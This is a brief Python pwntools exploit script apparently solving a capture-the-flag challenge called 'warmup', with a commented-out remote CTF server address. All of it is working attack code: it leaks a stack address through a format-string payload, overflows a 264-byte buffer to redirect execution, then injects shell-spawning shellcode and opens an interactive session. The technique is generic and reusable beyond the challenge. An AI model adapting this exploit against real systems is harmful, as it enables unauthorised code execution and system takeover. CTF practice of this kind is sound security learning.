from pwn import *


context.clear(arch='amd64')
shellcode = asm(shellcraft.sh())

p = process('warmup')
# p = remote("nothing.chal.ctf.westerns.tokyo", 10001)

p.recvuntil(':)\n')

fmt_str = '%47$p'
p.sendline(fmt_str + '\x41' * (264-len(fmt_str)) + p64(0x4006ba))

resp = p.recvuntil(':)\n')
print resp

stk = resp[2:14]
RIP = p64(int(stk,16) - 400)

p.sendline('\x5a' * (264-len(shellcode)) + shellcode + RIP)
p.interactive()